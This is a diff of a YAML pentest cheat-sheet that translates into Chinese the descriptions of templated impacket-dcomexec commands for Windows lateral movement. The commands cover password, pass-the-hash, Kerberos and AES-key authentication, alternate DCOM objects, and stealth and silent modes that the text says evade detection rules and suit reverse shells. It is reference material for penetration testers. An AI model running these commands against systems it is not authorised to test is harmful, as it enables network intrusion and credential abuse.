@@ -3,82 +3,60 @@ tags: [pentest, lateral-movement, security, windows, active-directory, impacket,
 
 actions:
   # === AUTHENTICATION METHODS ===
-  - title: impacket-dcomexec - basic password authentication
+  - title: impacket-dcomexec - 基础密码认证
     desc: |
-      Executes a command on a remote host using a cleartext password. 
-      This is the most straightforward method for lateral movement when valid credentials are available. 
-      It defaults to the ShellWindows DCOM object to execute the specified command.
+      使用明文密码在远程主机上执行命令。当拥有有效凭据时，这是横向移动最直接的方法。它默认使用 ShellWindows DCOM 对象执行指定命令。
     command: "impacket-dcomexec {{domain|.}}/{{username}}:{{password}}@{{target_ip}} '{{command|whoami}}'"
 
-  - title: impacket-dcomexec - pass-the-hash
+  - title: impacket-dcomexec - Pass-the-Hash
     desc: |
-      Performs remote command execution using NTLM hashes instead of a plaintext password. 
-      The hash must be provided in the LMHASH:NTHASH format; if the LM hash is unknown, use 32 zeros. 
-      This method is vital for moving laterally after extracting hashes from memory or the SAM database without cracking them.
+      使用 NTLM 哈希而非明文密码执行远程命令。哈希必须以 LMHASH:NTHASH 格式提供；如果 LM 哈希未知，请使用 32 个零。在从内存或 SAM 数据库提取哈希后无需破解即可横向移动时，此方法至关重要。
     command: "impacket-dcomexec -hashes {{lm_hash|00000000000000000000000000000000}}:{{nt_hash}} {{domain|.}}/{{username}}@{{target_ip}} '{{command|hostname}}'"
 
-  - title: impacket-dcomexec - kerberos authentication
+  - title: impacket-dcomexec - Kerberos 认证
     desc: |
-      Uses Kerberos tickets for authentication instead of NTLM, which is useful in environments where NTLM is disabled. 
-      You must provide the -k flag and ensure you have a valid Kerberos ticket in your cache (KRB5CCNAME). 
-      Specifying the -dc-ip is often required to resolve the Domain Controller's address correctly during the ticket validation process.
+      使用 Kerberos 票据而非 NTLM 进行认证，这在禁用 NTLM 的环境中非常有用。你必须提供 -k 参数，并确保缓存（KRB5CCNAME）中有有效的 Kerberos 票据。指定 -dc-ip 通常用于在票据验证过程中正确解析域控制器的地址。
     command: "impacket-dcomexec -k -no-pass -dc-ip {{dc_ip}} {{domain}}/{{username}}@{{target_hostname}} '{{command}}'"
 
   # === DCOM OBJECT SELECTION ===
-  - title: impacket-dcomexec - use MMC20.Application object
+  - title: impacket-dcomexec - 使用 MMC20.Application 对象
     desc: |
-      Leverages the MMC20.Application DCOM object to execute commands on the target. 
-      Different DCOM objects can be used to bypass specific security controls or detection patterns that might monitor only the default object. 
-      The MMC20 object is a common alternative that provides similar execution capabilities as ShellWindows.
+      利用 MMC20.Application DCOM 对象在目标上执行命令。不同的 DCOM 对象可用于绕过可能只监控默认对象的特定安全控制或检测模式。MMC20 对象是一种常见的替代方案，提供与 ShellWindows 类似的执行能力。
     command: "impacket-dcomexec -object MMC20 {{domain|.}}/{{username}}:{{password}}@{{target_ip}} '{{command}}'"
 
-  - title: impacket-dcomexec - use ShellBrowserWindow object
+  - title: impacket-dcomexec - 使用 ShellBrowserWindow 对象
     desc: |
-      Utilizes the ShellBrowserWindow DCOM object for command execution. 
-      This is one of the three supported objects in the tool and might be useful if other objects are restricted by policy. 
-      It essentially provides another path for lateral movement through the DCOM interface.
+      利用 ShellBrowserWindow DCOM 对象执行命令。这是工具支持的三个对象之一，如果其他对象受策略限制，它可能有用。它本质上提供了通过 DCOM 接口进行横向移动的另一条路径。
     command: "impacket-dcomexec -object ShellBrowserWindow {{domain|.}}/{{username}}:{{password}}@{{target_ip}} '{{command}}'"
 
   # === EXECUTION MODES ===
-  - title: impacket-dcomexec - semi-interactive shell
+  - title: impacket-dcomexec - 半交互式 Shell
     desc: |
-      Launches a semi-interactive shell on the remote target by omitting the command argument. 
-      This allows the user to run multiple commands sequentially without re-authenticating for every single action. 
-      The tool manages the output by reading it from a temporary file on the ADMIN$ share by default.
+      通过省略命令参数在远程目标上启动半交互式 Shell。这允许用户顺序运行多个命令，而无需为每个操作重新认证。工具默认从 ADMIN$ 共享上的临时文件读取输出。
     command: "impacket-dcomexec {{domain|.}}/{{username}}:{{password}}@{{target_ip}}"
 
-  - title: impacket-dcomexec - stealth mode (no output)
+  - title: impacket-dcomexec - 隐蔽模式（无输出）
     desc: |
-      Executes the command without establishing an SMB connection to retrieve the output. 
-      This is significantly more stealthy because it avoids creating files on the ADMIN$ share and reduces network traffic. 
-      It is ideal for executing reverse shells or "fire-and-forget" scripts where you do not need to see the command's stdout.
+      执行命令而不建立 SMB 连接来获取输出。这显著更加隐蔽，因为它避免在 ADMIN$ 共享上创建文件并减少网络流量。非常适合执行反向 shell 或无需查看命令 stdout 的一次性脚本。
     command: "impacket-dcomexec -nooutput {{domain|.}}/{{username}}:{{password}}@{{target_ip}} '{{command}}'"
 
-  - title: impacket-dcomexec - silent command execution
+  - title: impacket-dcomexec - 静默命令执行
     desc: |
-      Executes the command directly without invoking 'cmd.exe /c'. 
-      This can help in bypassing simple command-line auditing or detection rules that look for cmd.exe execution patterns. 
-      Note that when using this flag, you cannot use built-in shell commands like 'dir' or 'cd' directly.
+      直接执行命令而不调用 cmd.exe /c。这有助于绕过查找 cmd.exe 执行模式的简单命令行审计或检测规则。请注意，使用此参数时不能直接使用 dir 或 cd 等内置 shell 命令。
     command: "impacket-dcomexec -silentcommand {{domain|.}}/{{username}}:{{password}}@{{target_ip}} '{{command}}'"
 
   # === ADVANCED CONFIGURATION ===
-  - title: impacket-dcomexec - use powershell as shell type
+  - title: impacket-dcomexec - 使用 PowerShell 作为 Shell 类型
     desc: |
-      Forces the semi-interactive shell to use PowerShell as the command processor instead of the default cmd.exe. 
-      This is beneficial when the intended post-exploitation tasks require PowerShell's advanced scripting capabilities. 
-      Be aware that this may trigger AMSI or PowerShell Script Block Logging on modern Windows systems.
+      强制半交互式 Shell 使用 PowerShell 而非默认的 cmd.exe 作为命令处理器。当预期的后渗透任务需要 PowerShell 的高级脚本能力时，这很有帮助。请注意，这可能在现代 Windows 系统上触发 AMSI 或 PowerShell 脚本块日志记录。
     command: "impacket-dcomexec -shell-type powershell {{domain|.}}/{{username}}:{{password}}@{{target_ip}}"
 
-  - title: impacket-dcomexec - custom output share
+  - title: impacket-dcomexec - 自定义输出共享
     desc: |
-      Specifies a custom SMB share for retrieving command output instead of the default ADMIN$. 
-      This can be useful if the ADMIN$ share is restricted or if you want to use a less suspicious share name. 
-      The user must have write permissions to the specified share for output retrieval to function.
+      指定用于获取命令输出的自定义 SMB 共享，而非默认的 ADMIN$。如果 ADMIN$ 共享受限，或你想使用不太可疑的共享名，这会很有用。用户必须对指定共享具有写入权限，输出获取才能正常工作。
     command: "impacket-dcomexec -share {{share_name|C$}} {{domain|.}}/{{username}}:{{password}}@{{target_ip}} '{{command}}'"
 
-  - title: impacket-dcomexec - kerberos with AES key
+  - title: impacket-dcomexec - 使用 AES 密钥的 Kerberos
     desc: |
-      Authenticates using Kerberos by providing the AES hex key (128 or 256 bits). 
-      This is useful in advanced scenarios where the AES key is known but the password or NTLM hash is not available. 
-      It provides a robust way to authenticate against modern Active Directory environments.
+      通过提供 AES 十六进制密钥（128 或 256 位）使用 Kerberos 认证。在已知 AES 密钥但密码或 NTLM 哈希不可用的高级场景中非常有用。它为对现代 Active Directory 环境的认证提供了稳健的方式。
     command: "impacket-dcomexec -aesKey {{aes_key}} -k -no-pass {{domain}}/{{username}}@{{target_hostname}}"
